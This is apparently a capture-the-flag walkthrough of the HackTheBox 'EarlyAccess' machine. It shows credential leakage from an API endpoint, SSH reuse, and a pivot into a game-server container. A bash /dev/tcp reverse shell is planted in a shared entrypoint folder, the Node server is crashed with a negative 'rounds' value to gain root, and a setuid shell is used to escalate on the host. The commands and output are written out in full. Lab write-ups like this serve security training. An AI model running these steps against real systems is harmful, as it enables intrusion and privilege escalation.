```text
www-adm@webserver:/var/www/html/app$ cd ~
www-adm@webserver:~$ wget http://api:5000/
--2022-02-04 17:00:25--  http://api:5000/
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 254 [application/json]
Saving to: ‘index.html’
index.html      100%[============>]     254  --.-KB/s    in 0s      
2022-02-04 17:00:25 (18.3 MB/s) - ‘index.html’ saved [254/254]
```

## Verification API

Looking at the index file:

```text
www-adm@webserver:~$ cat index.html 
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>.
If you are using manual verification, you have to synchronize the magic_num here.
Admin users can verify the database using /check_db.","status":200}
```

Let's get the check_db file:

```text
www-adm@webserver:~$ wget http://api:5000/check_db
--2022-02-04 17:03:17--  http://api:5000/check_db
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 401 UNAUTHORIZED
Authentication selected: Basic
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8708 (8.5K) [application/json]
Saving to: ‘check_db’
check_db     100%[==============>]   8.50K  --.-KB/s    in 0s      
2022-02-04 17:03:17 (108 MB/s) - ‘check_db’ saved [8708/8708]
```

Looking at it the contents is json so copy to Kali and use jq to read it:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# jq '.' check_db                                                    
{
  "message": {
    "AppArmorProfile": "docker-default",
    "Args": [
      "--character-set-server=utf8mb4",
      "--collation-server=utf8mb4_bin",
      "--skip-character-set-client-handshake",
      "--max_allowed_packet=50MB",
      "--general_log=0",
      "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,
        NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,
        REAL_AS_FLOAT,STRICT_ALL_TABLES"
    ],
    "Config": {
      "AttachStderr": false,
      "AttachStdin": false,
      "AttachStdout": false,
      "Cmd": [
<SNIP>
```

It's a long file but a grep for password finds some credentials:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# jq '.' check_db | grep -i password
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=<HIDDEN>",
```

## Drew SSH Access

Let's try them for user drew via SSH:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# ssh drew@earlyaccess.htb       
You have mail.
Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6
drew@earlyaccess:~$ 
```

We're in. I notice it says we have mail, let's check that:

```text
drew@earlyaccess:~$ cat /var/mail/drew
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021
Hi Drew!
Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart 
the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.
If you find any other problems, please don't hesitate to report them!
Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

It tells us the game server will restart automatically if it hangs or crashes. I also found this ssh file in drew's home folder:

```text
drew@earlyaccess:~$ cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1y<SNIP>c2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server
```

We can log on to game-server as user game-tester with this. Looking at IP we see another container:

```text
drew@earlyaccess:~$ ip n 2>/dev/null
172.19.0.2 dev br-b052cf9302f7 lladdr 02:42:ac:13:00:02 STALE
172.18.0.2 dev br-6489f03765ae lladdr 02:42:ac:12:00:02 STALE
172.18.0.102 dev br-6489f03765ae lladdr 02:42:ac:12:00:66 STALE
10.10.10.2 dev ens160 lladdr 00:50:56:b9:72:c3 REACHABLE
```

## Game Server

Let's log in to there:

```text
drew@earlyaccess:~$ ssh game-tester@172.19.0.2
game-tester@game-server:~$ 
```

Time for some enumeration. Looking at the root folder:

```text
game-tester@game-server:~$ ls -lsa /
4 drwxrwxr-t   2 root 1000 4096 Feb  4 17:57 docker-entrypoint.d
4 -rwxr-xr--   1 root root  141 Aug 19 14:15 entrypoint.sh
```

Look at the entrypoint script:

```text
game-tester@game-server:~$ cat /entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

This script is owned by root and is running anything in the docker-entrypoint.d folder. In there we see a script, let's look the contents of it:

```text
game-tester@game-server:~$ cat /docker-entrypoint.d/node-server.sh  
service ssh start
cd /usr/src/app
# Install dependencies
npm install
sudo -u node node server.js
```

A script called server.js is being run from the /usr/src/app folder. Looking at that script we see it's a game of tic-tac-toe, and is listening on port 9999. There's an autoplay function which lets us specify how many rounds to play, let's try it from SSH session on the earlyaccess server:

```html
drew@earlyaccess:~$ curl -X POST -d "rounds=3" http://172.19.0.4:9999/autoplay 
<html>
  <body>
    <h1>Starting autoplay with 3 rounds</h1>
    <h4>Stats:</h4>
    <p>Wins: 1</p>
    <p>Losses: 2</p>
    <p>Ties: 0</p>
    <a href="/autoplay">Go back</a>
  </body>
</html>
```

In the script we also see this:

```js
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }
```

## Crashing Game Server

So to get root on game-server we need a way of crashing the server, then when it restarts we need to have a file with a reverse shell in it in the /docker-entrypoint.d/ folder so it gets executed.

On game-server we see this:

```text
game-tester@game-server:~$ ls -l /
drwxrwxr-t   2 root 1000 4096 Feb  6 11:38 docker-entrypoint.d
```

And on earlyaccess server we see this:

```text
drew@earlyaccess:~$ ls -l /opt
total 8
drwx--x--x 4 root root 4096 Jul 14  2021 containerd
drwxrwxr-t 2 root drew 4096 Feb  6 12:39 docker-entrypoint.d
```

So we have write access to the folder as drew on earlyaccess server, and that folder is mounted on the game-server. Let's drop a reverse shell in there, then crash the game. We'll need to do this as a loop because there is a clean up task running that empties the docker-entrypoint.d folder every minute:

```sh
drew@earlyaccess:~$ while true; do echo "bash -i >& /dev/tcp/10.10.14.12/1337 0>&1" > /opt/docker-entrypoint.d/pencer.sh && chmod +x /opt/docker-entrypoint.d/pencer.sh && sleep 1; done
```

Leave that running and start another SSH session as drew to earlyaccess.htb. From there call the script with autoplay as before, but this time use a negative value:

```text
drew@earlyaccess:/opt/docker-entrypoint.d$ curl -X POST -d "rounds=-3" http://172.19.0.3:9999/autoplay
curl: (52) Empty reply from server
```

## Root Access

Have a netcat listener on your Kali waiting, and when the above crashes the game-server we'll see a connection to us from it as root:

```sh
┌──(root💀kali)-[~]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.110] 59062
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/usr/src/app# 
```

Now we're root on game-server we can copy /bin/sh to the shared folder and give it the sticky bit:

```text
root@game-server:/# cd docker-entrypoint.d
root@game-server:/docker-entrypoint.d# cp /bin/sh . && chmod u+s sh
```

Finally back on earlyaccess as drew we can escalate to root and grab the flag:

```text
drew@earlyaccess:/opt/docker-entrypoint.d$ ls -lsa
  4 -rwxr-xr-x 1 root root    100 Feb  6 13:23 node-server.sh
  4 -rwxr-xr-x 1 drew drew     42 Feb  6 13:23 pencer.sh
116 -rwsr-xr-x 1 root root 117208 Feb  6 13:23 sh

drew@earlyaccess:/opt/docker-entrypoint.d$ ./sh
#
# id
uid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)
#
# cat /root/root.txt
913303c08fc7d61d3b3a8e31db502e01
```

All done. For me that was a really hard box, but enjoyable and I learnt a few things on the way. Hopefully this walkthrough helped you too. See you next time.
